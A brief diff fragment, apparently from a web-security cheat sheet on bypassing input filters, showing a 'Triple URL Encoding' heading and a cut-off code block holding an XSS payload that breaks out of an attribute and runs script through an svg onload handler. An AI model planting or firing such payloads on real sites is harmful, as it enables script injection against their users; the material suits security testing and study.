@@ -2,6 +2,7 @@
 
 ## Triple URL Encoding
   - Encode the payload thrice using URL encoding.
+
 Restricted:
 ```CSS
 "><svg onload=confirm(‘XSS’)> 
